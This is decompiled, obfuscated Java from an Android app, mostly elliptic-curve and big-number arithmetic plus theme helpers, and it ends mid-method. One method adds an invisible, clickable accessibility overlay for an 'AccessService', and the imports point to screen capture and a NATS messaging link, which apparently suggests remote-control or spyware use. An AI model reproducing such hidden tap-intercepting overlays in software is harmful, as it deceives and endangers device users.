package defpackage;

import android.R;
import android.animation.TimeInterpolator;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.util.TypedValue;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.animation.AnimationUtils;
import android.view.animation.Interpolator;
import android.widget.FrameLayout;
import android.widget.TextView;
import com.mamimobi.AccessService;
import com.mamimobi.videostream.ScreenRequestActivity;
import io.nats.client.support.NatsConstants;
import io.nats.client.support.NatsJetStreamConstants;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.List;
import java.util.concurrent.atomic.AtomicLongFieldUpdater;
import java.util.concurrent.atomic.AtomicReferenceFieldUpdater;
import org.bouncycastle.crypto.CryptoServicePurpose;
import org.bouncycastle.crypto.a;
import org.bouncycastle.crypto.digests.SHAKENativeDigest;

/* JADX INFO: loaded from: classes.dex */
public abstract class s90 implements zv0, j61 {
    public static String a;
    public static String b;
    public static String c;
    public static String d;
    public static String e;
    public static String f;
    public static String g;
    public static String h;
    public static String i;
    public static Field j;
    public static boolean k;
    public static Class l;
    public static boolean m;
    public static Field n;
    public static boolean o;
    public static Field p;
    public static boolean q;
    public static FrameLayout r;
    public static boolean s;
    public static WindowManager.LayoutParams t;
    public static TextView u;
    public static WindowManager v;

    public static void A() {
        if (s) {
            new Handler(Looper.getMainLooper()).post(new l1(9));
            s = false;
        }
    }

    public static void B(long[] jArr, long[] jArr2) {
        long j2 = jArr[0];
        long j3 = jArr[1];
        long j4 = jArr[2];
        long j5 = jArr[3];
        jArr2[0] = j2 & 576460752303423487L;
        jArr2[1] = ((j2 >>> 59) ^ (j3 << 5)) & 576460752303423487L;
        jArr2[2] = ((j3 >>> 54) ^ (j4 << 10)) & 576460752303423487L;
        jArr2[3] = (j4 >>> 49) ^ (j5 << 15);
    }

    public static void C(long[] jArr, long[] jArr2, long[] jArr3) {
        long[] jArr4 = new long[4];
        long[] jArr5 = new long[4];
        B(jArr, jArr4);
        B(jArr2, jArr5);
        long[] jArr6 = new long[8];
        D(jArr6, jArr4[0], jArr5[0], jArr3, 0);
        D(jArr6, jArr4[1], jArr5[1], jArr3, 1);
        D(jArr6, jArr4[2], jArr5[2], jArr3, 2);
        D(jArr6, jArr4[3], jArr5[3], jArr3, 3);
        for (int i2 = 5; i2 > 0; i2--) {
            jArr3[i2] = jArr3[i2] ^ jArr3[i2 - 1];
        }
        D(jArr6, jArr4[0] ^ jArr4[1], jArr5[0] ^ jArr5[1], jArr3, 1);
        D(jArr6, jArr4[2] ^ jArr4[3], jArr5[2] ^ jArr5[3], jArr3, 3);
        for (int i3 = 7; i3 > 1; i3--) {
            jArr3[i3] = jArr3[i3] ^ jArr3[i3 - 2];
        }
        long j2 = jArr4[0] ^ jArr4[2];
        long j3 = jArr4[1] ^ jArr4[3];
        long j4 = jArr5[0] ^ jArr5[2];
        long j5 = jArr5[3] ^ jArr5[1];
        D(jArr6, j2 ^ j3, j4 ^ j5, jArr3, 3);
        long[] jArr7 = new long[3];
        D(jArr6, j2, j4, jArr7, 0);
        D(jArr6, j3, j5, jArr7, 1);
        long j6 = jArr7[0];
        long j7 = jArr7[1];
        long j8 = jArr7[2];
        long j9 = jArr3[2] ^ j6;
        jArr3[2] = j9;
        long j10 = jArr3[3] ^ (j6 ^ j7);
        jArr3[3] = j10;
        long j11 = jArr3[4] ^ (j7 ^ j8);
        jArr3[4] = j11;
        long j12 = jArr3[5] ^ j8;
        jArr3[5] = j12;
        long j13 = jArr3[0];
        long j14 = jArr3[1];
        long j15 = jArr3[6];
        long j16 = jArr3[7];
        jArr3[0] = j13 ^ (j14 << 59);
        jArr3[1] = (j14 >>> 5) ^ (j9 << 54);
        jArr3[2] = (j9 >>> 10) ^ (j10 << 49);
        jArr3[3] = (j10 >>> 15) ^ (j11 << 44);
        jArr3[4] = (j11 >>> 20) ^ (j12 << 39);
        jArr3[5] = (j12 >>> 25) ^ (j15 << 34);
        jArr3[6] = (j15 >>> 30) ^ (j16 << 29);
        jArr3[7] = j16 >>> 35;
    }

    public static void D(long[] jArr, long j2, long j3, long[] jArr2, int i2) {
        jArr[1] = j3;
        long j4 = j3 << 1;
        jArr[2] = j4;
        long j5 = j4 ^ j3;
        jArr[3] = j5;
        long j6 = j3 << 2;
        jArr[4] = j6;
        jArr[5] = j6 ^ j3;
        long j7 = j5 << 1;
        jArr[6] = j7;
        jArr[7] = j7 ^ j3;
        int i3 = (int) j2;
        long j8 = (jArr[(i3 >>> 3) & 7] << 3) ^ jArr[i3 & 7];
        long j9 = 0;
        int i4 = 54;
        do {
            int i5 = (int) (j2 >>> i4);
            long j10 = jArr[i5 & 7] ^ (jArr[(i5 >>> 3) & 7] << 3);
            j8 ^= j10 << i4;
            j9 ^= j10 >>> (-i4);
            i4 -= 6;
        } while (i4 > 0);
        jArr2[i2] = jArr2[i2] ^ (576460752303423487L & j8);
        int i6 = i2 + 1;
        jArr2[i6] = jArr2[i6] ^ ((j8 >>> 59) ^ (j9 << 5));
    }

    public static boolean E(String str, String str2) {
        return str.startsWith(str2.concat("(")) && str.endsWith(")");
    }

    public static boolean F(int[] iArr) {
        if (iArr[0] != 1) {
            return false;
        }
        for (int i2 = 1; i2 < 7; i2++) {
            if (iArr[i2] != 0) {
                return false;
            }
        }
        return true;
    }

    public static boolean G(int[] iArr) {
        for (int i2 = 0; i2 < 7; i2++) {
            if (iArr[i2] != 0) {
                return false;
            }
        }
        return true;
    }

    public static boolean H(long[] jArr) {
        for (int i2 = 0; i2 < 9; i2++) {
            if (jArr[i2] != 0) {
                return false;
            }
        }
        return true;
    }

    public static String I(String str, String str2, s8 s8Var) {
        byte[] bArrL;
        StringBuffer stringBuffer = new StringBuffer();
        String str3 = jx0.a;
        if (s8Var instanceof m91) {
            bArrL = z91.l(((m91) s8Var).F);
        } else if (s8Var instanceof ds) {
            byte[] bArr = new byte[57];
            ((ds) s8Var).a(0, bArr);
            bArrL = bArr;
        } else {
            bArrL = s8Var instanceof k91 ? z91.l(((k91) s8Var).F) : ((as) s8Var).getEncoded();
        }
        stringBuffer.append(str2);
        stringBuffer.append(NatsConstants.SPACE);
        stringBuffer.append(str);
        stringBuffer.append(" [");
        zq0 sHAKENativeDigest = a.c("SHAKE") ? new SHAKENativeDigest(NatsJetStreamConstants.MAX_PULL_SIZE, CryptoServicePurpose.ANY) : new gq0(NatsJetStreamConstants.MAX_PULL_SIZE);
        sHAKENativeDigest.e(bArrL, 0, bArrL.length);
        byte[] bArr2 = new byte[20];
        sHAKENativeDigest.h(bArr2, 0, 20);
        StringBuffer stringBuffer2 = new StringBuffer();
        for (int i2 = 0; i2 != 20; i2++) {
            if (i2 > 0) {
                stringBuffer2.append(":");
            }
            char[] cArr = t40.e;
            stringBuffer2.append(cArr[(bArr2[i2] >>> 4) & 15]);
            stringBuffer2.append(cArr[bArr2[i2] & 15]);
        }
        stringBuffer.append(stringBuffer2.toString());
        stringBuffer.append("]");
        stringBuffer.append(str3);
        stringBuffer.append("    public data: ");
        stringBuffer.append(jx0.a(c30.c(bArrL, 0, bArrL.length)));
        stringBuffer.append(str3);
        return stringBuffer.toString();
    }

    public static void J(String str, Exception exc) {
        Log.e(str, "Error: " + exc.getMessage(), exc);
    }

    public static Typeface K(Configuration configuration, Typeface typeface) {
        if (Build.VERSION.SDK_INT < 31 || configuration.fontWeightAdjustment == Integer.MAX_VALUE || configuration.fontWeightAdjustment == 0 || typeface == null) {
            return null;
        }
        return Typeface.create(typeface, m(configuration.fontWeightAdjustment + typeface.getWeight(), 1, 1000), typeface.isItalic());
    }

    public static void L(int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = ((long) iArr2[0]) & 4294967295L;
        long j3 = ((long) iArr2[1]) & 4294967295L;
        long j4 = ((long) iArr2[2]) & 4294967295L;
        long j5 = ((long) iArr2[3]) & 4294967295L;
        long j6 = ((long) iArr2[4]) & 4294967295L;
        long j7 = ((long) iArr2[5]) & 4294967295L;
        long j8 = ((long) iArr2[6]) & 4294967295L;
        long j9 = ((long) iArr[0]) & 4294967295L;
        long j10 = j9 * j2;
        iArr3[0] = (int) j10;
        long j11 = (j9 * j3) + (j10 >>> 32);
        iArr3[1] = (int) j11;
        long j12 = (j9 * j4) + (j11 >>> 32);
        iArr3[2] = (int) j12;
        long j13 = (j9 * j5) + (j12 >>> 32);
        iArr3[3] = (int) j13;
        long j14 = (j9 * j6) + (j13 >>> 32);
        iArr3[4] = (int) j14;
        long j15 = (j9 * j7) + (j14 >>> 32);
        iArr3[5] = (int) j15;
        long j16 = (j9 * j8) + (j15 >>> 32);
        iArr3[6] = (int) j16;
        iArr3[7] = (int) (j16 >>> 32);
        int i2 = 1;
        for (int i3 = 7; i2 < i3; i3 = 7) {
            long j17 = ((long) iArr[i2]) & 4294967295L;
            long j18 = (j17 * j2) + (((long) iArr3[i2]) & 4294967295L);
            iArr3[i2] = (int) j18;
            int i4 = i2 + 1;
            long j19 = j6;
            long j20 = (j17 * j3) + (((long) iArr3[i4]) & 4294967295L) + (j18 >>> 32);
            iArr3[i4] = (int) j20;
            int i5 = i2 + 2;
            long j21 = (j17 * j4) + (((long) iArr3[i5]) & 4294967295L) + (j20 >>> 32);
            iArr3[i5] = (int) j21;
            int i6 = i2 + 3;
            long j22 = (j17 * j5) + (((long) iArr3[i6]) & 4294967295L) + (j21 >>> 32);
            iArr3[i6] = (int) j22;
            int i7 = i2 + 4;
            long j23 = (j17 * j19) + (((long) iArr3[i7]) & 4294967295L) + (j22 >>> 32);
            iArr3[i7] = (int) j23;
            int i8 = i2 + 5;
            long j24 = (j17 * j7) + (((long) iArr3[i8]) & 4294967295L) + (j23 >>> 32);
            iArr3[i8] = (int) j24;
            int i9 = i2 + 6;
            long j25 = (j17 * j8) + (((long) iArr3[i9]) & 4294967295L) + (j24 >>> 32);
            iArr3[i9] = (int) j25;
            iArr3[i2 + 7] = (int) (j25 >>> 32);
            i2 = i4;
            j6 = j19;
        }
    }

    public static int M(int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = ((long) iArr2[0]) & 4294967295L;
        long j3 = ((long) iArr2[1]) & 4294967295L;
        long j4 = ((long) iArr2[2]) & 4294967295L;
        long j5 = ((long) iArr2[3]) & 4294967295L;
        long j6 = ((long) iArr2[4]) & 4294967295L;
        long j7 = ((long) iArr2[5]) & 4294967295L;
        long j8 = ((long) iArr2[6]) & 4294967295L;
        long j9 = 0;
        int i2 = 0;
        while (i2 < 7) {
            long j10 = j8;
            long j11 = ((long) iArr[i2]) & 4294967295L;
            long j12 = (((long) iArr3[i2]) & 4294967295L) + (j11 * j2);
            iArr3[i2] = (int) j12;
            int i3 = i2 + 1;
            long j13 = (j11 * j3) + (((long) iArr3[i3]) & 4294967295L) + (j12 >>> 32);
            iArr3[i3] = (int) j13;
            int i4 = i2 + 2;
            long j14 = (j11 * j4) + (((long) iArr3[i4]) & 4294967295L) + (j13 >>> 32);
            int i5 = i2;
            iArr3[i4] = (int) j14;
            int i6 = i5 + 3;
            long j15 = (j11 * j5) + (((long) iArr3[i6]) & 4294967295L) + (j14 >>> 32);
            iArr3[i6] = (int) j15;
            int i7 = i5 + 4;
            long j16 = (j11 * j6) + (((long) iArr3[i7]) & 4294967295L) + (j15 >>> 32);
            iArr3[i7] = (int) j16;
            int i8 = i5 + 5;
            long j17 = (j11 * j7) + (((long) iArr3[i8]) & 4294967295L) + (j16 >>> 32);
            iArr3[i8] = (int) j17;
            int i9 = i5 + 6;
            long j18 = (j11 * j10) + (((long) iArr3[i9]) & 4294967295L) + (j17 >>> 32);
            iArr3[i9] = (int) j18;
            int i10 = i5 + 7;
            long j19 = (j18 >>> 32) + (((long) iArr3[i10]) & 4294967295L) + j9;
            iArr3[i10] = (int) j19;
            j9 = j19 >>> 32;
            i2 = i3;
            j8 = j10;
        }
        return (int) j9;
    }

    public static void N(long[] jArr, long[] jArr2, long[] jArr3) {
        long[] jArr4 = new long[8];
        C(jArr, jArr2, jArr4);
        Q(jArr4, jArr3);
    }

    public static void Q(long[] jArr, long[] jArr2) {
        long j2 = jArr[0];
        long j3 = jArr[1];
        long j4 = jArr[2];
        long j5 = jArr[3];
        long j6 = jArr[4];
        long j7 = jArr[5];
        long j8 = jArr[6];
        long j9 = jArr[7];
        long j10 = j7 ^ (j9 >>> 31);
        long j11 = (j6 ^ ((j9 >>> 41) ^ (j9 << 33))) ^ (j8 >>> 31);
        long j12 = ((j5 ^ (j9 << 23)) ^ ((j8 >>> 41) ^ (j8 << 33))) ^ (j10 >>> 31);
        long j13 = j2 ^ (j11 << 23);
        long j14 = (j3 ^ (j10 << 23)) ^ ((j11 >>> 41) ^ (j11 << 33));
        long j15 = ((j4 ^ (j8 << 23)) ^ ((j10 >>> 41) ^ (j10 << 33))) ^ (j11 >>> 31);
        long j16 = j12 >>> 41;
        jArr2[0] = j13 ^ j16;
        jArr2[1] = (j16 << 10) ^ j14;
        jArr2[2] = j15;
        jArr2[3] = 2199023255551L & j12;
    }

    public static final void R(Object[] objArr, int i2, int i3) {
        t40.n(objArr, "<this>");
        while (i2 < i3) {
            objArr[i2] = null;
            i2++;
        }
    }

    public static TypedValue S(Context context, int i2) {
        TypedValue typedValue = new TypedValue();
        if (context.getTheme().resolveAttribute(i2, typedValue, true)) {
            return typedValue;
        }
        return null;
    }

    public static boolean T(Context context, int i2, boolean z) {
        TypedValue typedValueS = S(context, i2);
        return (typedValueS == null || typedValueS.type != 18) ? z : typedValueS.data != 0;
    }

    public static int U(Context context, int i2, int i3) {
        TypedValue typedValueS = S(context, i2);
        return (typedValueS == null || typedValueS.type != 16) ? i3 : typedValueS.data;
    }

    public static TimeInterpolator V(Context context, int i2, Interpolator interpolator) {
        TypedValue typedValue = new TypedValue();
        if (!context.getTheme().resolveAttribute(i2, typedValue, true)) {
            return interpolator;
        }
        if (typedValue.type != 3) {
            throw new IllegalArgumentException("Motion easing theme attribute must be an @interpolator resource for ?attr/motionEasing*Interpolator attributes or a string for ?attr/motionEasing* attributes.");
        }
        String strValueOf = String.valueOf(typedValue.string);
        if (!E(strValueOf, "cubic-bezier") && !E(strValueOf, "path")) {
            return AnimationUtils.loadInterpolator(context, typedValue.resourceId);
        }
        if (!E(strValueOf, "cubic-bezier")) {
            if (E(strValueOf, "path")) {
                return lk0.c(o80.r(strValueOf.substring(5, strValueOf.length() - 1)));
            }
            throw new IllegalArgumentException("Invalid motion easing type: ".concat(strValueOf));
        }
        String[] strArrSplit = strValueOf.substring(13, strValueOf.length() - 1).split(",");
        if (strArrSplit.length == 4) {
            return lk0.b(w(strArrSplit, 0), w(strArrSplit, 1), w(strArrSplit, 2), w(strArrSplit, 3));
        }
        throw new IllegalArgumentException("Motion easing theme attribute must have 4 control points if using bezier curve format; instead got: " + strArrSplit.length);
    }

    public static TypedValue W(Context context, int i2, String str) {
        TypedValue typedValueS = S(context, i2);
        if (typedValueS != null) {
            return typedValueS;
        }
        throw new IllegalArgumentException(String.format("%1$s requires a value for the %2$s attribute to be set in your app theme. You can either set the attribute in your theme or update your theme to inherit from Theme.MaterialComponents (or a descendant).", str, context.getResources().getResourceName(i2)));
    }

    public static void X(AccessService accessService) {
        if (Looper.myLooper() != Looper.getMainLooper()) {
            new Handler(Looper.getMainLooper()).post(new k1(accessService, 10));
            return;
        }
        if (r == null) {
            FrameLayout frameLayout = new FrameLayout(accessService);
            r = frameLayout;
            frameLayout.setVisibility(8);
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(2032, 544, 1);
            t = layoutParams;
            layoutParams.gravity = 51;
            layoutParams.width = -2;
            layoutParams.height = -2;
            v = (WindowManager) accessService.getSystemService("window");
            r.setBackgroundColor(0);
            v.addView(r, t);
            if (r == null) {
                return;
            }
        }
        if (u == null) {
            TextView textView = new TextView(accessService.getApplicationContext());
            u = textView;
            textView.setText("                             ");
            u.setLayoutParams(new FrameLayout.LayoutParams(-1, -1));
            u.setBackgroundColor(accessService.getResources().getColor(R.color.transparent));
            u.setClickable(true);
            u.setOnClickListener(new Cif(4, accessService));
            r.addView(u);
        }
        r.setPadding(0, 0, 0, 0);
        new Handler(Looper.getMainLooper()).postDelayed(new k1(accessService, 11), 500L);
    }

    public static void Y(int[] iArr, int[] iArr2) {
        long j2 = ((long) iArr[0]) & 4294967295L;
        int i2 = 14;
        int i3 = 0;
        int i4 = 6;
        while (true) {
            int i5 = i4 - 1;
            long j3 = ((long) iArr[i4]) & 4294967295L;
            long j4 = j3 * j3;
            iArr2[i2 - 1] = (i3 << 31) | ((int) (j4 >>> 33));
            i2 -= 2;
            iArr2[i2] = (int) (j4 >>> 1);
            i3 = (int) j4;
            if (i5 <= 0) {
                long j5 = j2 * j2;
                long j6 = (j5 >>> 33) | (((long) (i3 << 31)) & 4294967295L);
                iArr2[0] = (int) j5;
                int i6 = ((int) (j5 >>> 32)) & 1;
                long j7 = ((long) iArr[1]) & 4294967295L;
                long j8 = ((long) iArr2[2]) & 4294967295L;
                long j9 = (j7 * j2) + j6;
                int i7 = (int) j9;
                iArr2[1] = i6 | (i7 << 1);
                long j10 = ((long) iArr[2]) & 4294967295L;
                long j11 = ((long) iArr2[3]) & 4294967295L;
                long j12 = ((long) iArr2[4]) & 4294967295L;
                long j13 = (j10 * j2) + j8 + (j9 >>> 32);
                int i8 = (int) j13;
                iArr2[2] = (i8 << 1) | (i7 >>> 31);
                long jE = zn.e(j10, j7, j13 >>> 32, j11);
                long j14 = j12 + (jE >>> 32);
                long j15 = ((long) iArr[3]) & 4294967295L;
                long j16 = (((long) iArr2[5]) & 4294967295L) + (j14 >>> 32);
                long j17 = j14 & 4294967295L;
                long j18 = (((long) iArr2[6]) & 4294967295L) + (j16 >>> 32);
                long j19 = j16 & 4294967295L;
                long j20 = (j15 * j2) + (jE & 4294967295L);
                int i9 = (int) j20;
                iArr2[3] = (i8 >>> 31) | (i9 << 1);
                int i10 = i9 >>> 31;
                long jE2 = zn.e(j15, j7, j20 >>> 32, j17);
                long jE3 = zn.e(j15, j10, jE2 >>> 32, j19);
                long j21 = j18 + (jE3 >>> 32);
                long j22 = ((long) iArr[4]) & 4294967295L;
                long j23 = (((long) iArr2[7]) & 4294967295L) + (j21 >>> 32);
                long j24 = j21 & 4294967295L;
                long j25 = (((long) iArr2[8]) & 4294967295L) + (j23 >>> 32);
                long j26 = j23 & 4294967295L;
                long j27 = (j22 * j2) + (jE2 & 4294967295L);
                int i11 = (int) j27;
                iArr2[4] = i10 | (i11 << 1);
                int i12 = i11 >>> 31;
                long jE4 = zn.e(j22, j7, j27 >>> 32, jE3 & 4294967295L);
                long jE5 = zn.e(j22, j10, jE4 >>> 32, j24);
                long jE6 = zn.e(j22, j15, jE5 >>> 32, j26);
                long j28 = j25 + (jE6 >>> 32);
                long j29 = ((long) iArr[5]) & 4294967295L;
                long j30 = (((long) iArr2[9]) & 4294967295L) + (j28 >>> 32);
                long j31 = j28 & 4294967295L;
                long j32 = (((long) iArr2[10]) & 4294967295L) + (j30 >>> 32);
                long j33 = j30 & 4294967295L;
                long j34 = (j29 * j2) + (jE4 & 4294967295L);
                int i13 = (int) j34;
                iArr2[5] = i12 | (i13 << 1);
                int i14 = i13 >>> 31;
                long jE7 = zn.e(j29, j7, j34 >>> 32, jE5 & 4294967295L);
                long jE8 = zn.e(j29, j10, jE7 >>> 32, jE6 & 4294967295L);
                long jE9 = zn.e(j29, j15, jE8 >>> 32, j31);
                long j35 = jE8 & 4294967295L;
                long jE10 = zn.e(j29, j22, jE9 >>> 32, j33);
                long j36 = j32 + (jE10 >>> 32);
                long j37 = jE10 & 4294967295L;
                long j38 = ((long) iArr[6]) & 4294967295L;
                long j39 = (((long) iArr2[11]) & 4294967295L) + (j36 >>> 32);
                long j40 = j36 & 4294967295L;
                long j41 = (((long) iArr2[12]) & 4294967295L) + (j39 >>> 32);
                long j42 = j39 & 4294967295L;
                long j43 = (j38 * j2) + (jE7 & 4294967295L);
                int i15 = (int) j43;
                iArr2[6] = i14 | (i15 << 1);
                int i16 = i15 >>> 31;
                long jE11 = zn.e(j38, j7, j43 >>> 32, j35);
                long jE12 = zn.e(j38, j10, jE11 >>> 32, jE9 & 4294967295L);
                long jE13 = zn.e(j38, j15, jE12 >>> 32, j37);
                long jE14 = zn.e(j38, j22, jE13 >>> 32, j40);
                long jE15 = zn.e(j38, j29, jE14 >>> 32, j42);
                long j44 = j41 + (jE15 >>> 32);
                int i17 = (int) jE11;
                iArr2[7] = (i17 << 1) | i16;
                int i18 = (int) jE12;
                iArr2[8] = (i17 >>> 31) | (i18 << 1);
                int i19 = i18 >>> 31;
                int i20 = (int) jE13;
                iArr2[9] = i19 | (i20 << 1);
                int i21 = i20 >>> 31;
                int i22 = (int) jE14;
                iArr2[10] = i21 | (i22 << 1);
                int i23 = i22 >>> 31;
                int i24 = (int) jE15;
                iArr2[11] = i23 | (i24 << 1);
                int i25 = i24 >>> 31;
                int i26 = (int) j44;
                iArr2[12] = i25 | (i26 << 1);
                iArr2[13] = ((iArr2[13] + ((int) (j44 >>> 32))) << 1) | (i26 >>> 31);
                return;
            }
            i4 = i5;
        }
    }

    public static void Z(long[] jArr, long[] jArr2) {
        long[] jArr3 = new long[8];
        qm.o(4, jArr, jArr3);
        Q(jArr3, jArr2);
    }

    public static void a0(int i2, long[] jArr, long[] jArr2) {
        long[] jArr3 = new long[8];
        qm.o(4, jArr, jArr3);
        while (true) {
            Q(jArr3, jArr2);
            i2--;
            if (i2 <= 0) {
                return;
            } else {
                qm.o(4, jArr2, jArr3);
            }
        }
    }

    public static int b0(int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = (((long) iArr[0]) & 4294967295L) - (((long) iArr2[0]) & 4294967295L);
        iArr3[0] = (int) j2;
        long j3 = ((((long) iArr[1]) & 4294967295L) - (((long) iArr2[1]) & 4294967295L)) + (j2 >> 32);
        iArr3[1] = (int) j3;
        long j4 = ((((long) iArr[2]) & 4294967295L) - (((long) iArr2[2]) & 4294967295L)) + (j3 >> 32);
        iArr3[2] = (int) j4;
        long j5 = ((((long) iArr[3]) & 4294967295L) - (((long) iArr2[3]) & 4294967295L)) + (j4 >> 32);
        iArr3[3] = (int) j5;
        long j6 = ((((long) iArr[4]) & 4294967295L) - (((long) iArr2[4]) & 4294967295L)) + (j5 >> 32);
        iArr3[4] = (int) j6;
        long j7 = ((((long) iArr[5]) & 4294967295L) - (((long) iArr2[5]) & 4294967295L)) + (j6 >> 32);
        iArr3[5] = (int) j7;
        long j8 = ((((long) iArr[6]) & 4294967295L) - (((long) iArr2[6]) & 4294967295L)) + (j7 >> 32);
        iArr3[6] = (int) j8;
        return (int) (j8 >> 32);
    }

    public static BigInteger c0(int[] iArr) {
        byte[] bArr = new byte[28];
        for (int i2 = 0; i2 < 7; i2++) {
            int i3 = iArr[i2];
            if (i3 != 0) {
                ma0.K(bArr, i3, (6 - i2) << 2);
            }
        }
        return new BigInteger(1, bArr);
    }

    public static final boolean f(Object[] objArr, int i2, int i3, List list) {
        if (i3 == list.size()) {
            for (int i4 = 0; i4 < i3; i4++) {
                if (t40.f(objArr[i2 + i4], list.get(i4))) {
                }
            }
            return true;
        }
        return false;
    }

    public static final String g(Object[] objArr, int i2, int i3, w0 w0Var) {
        StringBuilder sb = new StringBuilder((i3 * 3) + 2);
        sb.append("[");
        for (int i4 = 0; i4 < i3; i4++) {
            if (i4 > 0) {
                sb.append(", ");
            }
            Object obj = objArr[i2 + i4];
            if (obj == w0Var) {
                sb.append("(this Collection)");
            } else {
                sb.append(obj);
            }
        }
        sb.append("]");
        String string = sb.toString();
        t40.m(string, "toString(...)");
        return string;
    }

    public static int h(int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = (((long) iArr[0]) & 4294967295L) + (((long) iArr2[0]) & 4294967295L);
        iArr3[0] = (int) j2;
        long j3 = (((long) iArr[1]) & 4294967295L) + (((long) iArr2[1]) & 4294967295L) + (j2 >>> 32);
        iArr3[1] = (int) j3;
        long j4 = (((long) iArr[2]) & 4294967295L) + (((long) iArr2[2]) & 4294967295L) + (j3 >>> 32);
        iArr3[2] = (int) j4;
        long j5 = (((long) iArr[3]) & 4294967295L) + (((long) iArr2[3]) & 4294967295L) + (j4 >>> 32);
        iArr3[3] = (int) j5;
        long j6 = (((long) iArr[4]) & 4294967295L) + (((long) iArr2[4]) & 4294967295L) + (j5 >>> 32);
        iArr3[4] = (int) j6;
        long j7 = (((long) iArr[5]) & 4294967295L) + (((long) iArr2[5]) & 4294967295L) + (j6 >>> 32);
        iArr3[5] = (int) j7;
        long j8 = (((long) iArr[6]) & 4294967295L) + (((long) iArr2[6]) & 4294967295L) + (j7 >>> 32);
        iArr3[6] = (int) j8;
        return (int) (j8 >>> 32);
    }

    public static int i(int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = (((long) iArr[0]) & 4294967295L) + (((long) iArr2[0]) & 4294967295L) + (((long) iArr3[0]) & 4294967295L);
        iArr3[0] = (int) j2;
        long j3 = (((long) iArr[1]) & 4294967295L) + (((long) iArr2[1]) & 4294967295L) + (((long) iArr3[1]) & 4294967295L) + (j2 >>> 32);
        iArr3[1] = (int) j3;
        long j4 = (((long) iArr[2]) & 4294967295L) + (((long) iArr2[2]) & 4294967295L) + (((long) iArr3[2]) & 4294967295L) + (j3 >>> 32);
        iArr3[2] = (int) j4;
        long j5 = (((long) iArr[3]) & 4294967295L) + (((long) iArr2[3]) & 4294967295L) + (((long) iArr3[3]) & 4294967295L) + (j4 >>> 32);
        iArr3[3] = (int) j5;
        long j6 = (((long) iArr[4]) & 4294967295L) + (((long) iArr2[4]) & 4294967295L) + (((long) iArr3[4]) & 4294967295L) + (j5 >>> 32);
        iArr3[4] = (int) j6;
        long j7 = (((long) iArr[5]) & 4294967295L) + (((long) iArr2[5]) & 4294967295L) + (((long) iArr3[5]) & 4294967295L) + (j6 >>> 32);
        iArr3[5] = (int) j7;
        long j8 = (((long) iArr[6]) & 4294967295L) + (((long) iArr2[6]) & 4294967295L) + (((long) iArr3[6]) & 4294967295L) + (j7 >>> 32);
        iArr3[6] = (int) j8;
        return (int) (j8 >>> 32);
    }

    public static void j(long[] jArr, long[] jArr2, long[] jArr3) {
        jArr3[0] = jArr[0] ^ jArr2[0];
        jArr3[1] = jArr[1] ^ jArr2[1];
        jArr3[2] = jArr[2] ^ jArr2[2];
        jArr3[3] = jArr[3] ^ jArr2[3];
        jArr3[4] = jArr[4] ^ jArr2[4];
        jArr3[5] = jArr[5] ^ jArr2[5];
        jArr3[6] = jArr[6] ^ jArr2[6];
        jArr3[7] = jArr2[7] ^ jArr[7];
    }

    public static final String k(Number number, Number number2) {
        return "Random range is empty: [" + number + ", " + number2 + ").";
    }

    public static float l(float f2, float f3, float f4) {
        return f2 < f3 ? f3 : f2 > f4 ? f4 : f2;
    }

    public static int m(int i2, int i3, int i4) {
        return i2 < i3 ? i3 : i2 > i4 ? i4 : i2;
    }

    public static void n(nb nbVar) {
        boolean z;
        long j2;
        int i2;
        nb nbVar2;
        Object obj;
        wy0 wy0Var = pb.r;
        while (true) {
            AtomicReferenceFieldUpdater atomicReferenceFieldUpdater = nb.j;
            if (atomicReferenceFieldUpdater.compareAndSet(nbVar, wy0Var, null)) {
                z = true;
                break;
            } else if (atomicReferenceFieldUpdater.get(nbVar) != wy0Var) {
                z = false;
                break;
            }
        }
        while (true) {
            AtomicLongFieldUpdater atomicLongFieldUpdater = nb.c;
            long j3 = atomicLongFieldUpdater.get(nbVar);
            int i3 = (int) (j3 >> 60);
            if (i3 == 0) {
                j2 = 1152921504606846975L & j3;
                i2 = 2;
            } else if (i3 != 1) {
                nbVar2 = nbVar;
                break;
            } else {
                j2 = 1152921504606846975L & j3;
                i2 = 3;
            }
            nbVar2 = nbVar;
            if (atomicLongFieldUpdater.compareAndSet(nbVar2, j3, (((long) i2) << 60) + j2)) {
                break;
            } else {
                nbVar = nbVar2;
            }
        }
        nbVar2.g();
        if (z) {
            loop2: while (true) {
                AtomicReferenceFieldUpdater atomicReferenceFieldUpdater2 = nb.k;
                obj = atomicReferenceFieldUpdater2.get(nbVar2);
                wy0 wy0Var2 = obj == null ? pb.p : pb.q;
                while (!atomicReferenceFieldUpdater2.compareAndSet(nbVar2, obj, wy0Var2)) {
                    if (atomicReferenceFieldUpdater2.get(nbVar2) != obj) {
                        break;
                    }
                }
            }
            if (obj == null) {
                return;
            }
            l21.m(1, obj);
            ((b10) obj).invoke(nbVar2.k());
        }
    }

    public static void o(int i2, int[] iArr, int[] iArr2) {
        iArr2[i2] = iArr[0];
        iArr2[i2 + 1] = iArr[1];
        iArr2[i2 + 2] = iArr[2];
        iArr2[i2 + 3] = iArr[3];
        iArr2[i2 + 4] = iArr[4];
        iArr2[i2 + 5] = iArr[5];
        iArr2[i2 + 6] = iArr[6];
    }

    public static void p(int[] iArr, int[] iArr2) {
        iArr2[0] = iArr[0];
        iArr2[1] = iArr[1];
        iArr2[2] = iArr[2];
        iArr2[3] = iArr[3];
        iArr2[4] = iArr[4];
        iArr2[5] = iArr[5];
        iArr2[6] = iArr[6];
    }

    public static void q(int i2, long[] jArr, long[] jArr2) {
        jArr2[i2] = jArr[0];
        jArr2[i2 + 1] = jArr[1];
        jArr2[i2 + 2] = jArr[2];
        jArr2[i2 + 3] = jArr[3];
        jArr2[i2 + 4] = jArr[4];
        jArr2[i2 + 5] = jArr[5];
        jArr2[i2 + 6] = jArr[6];
        jArr2[i2 + 7] = jArr[7];
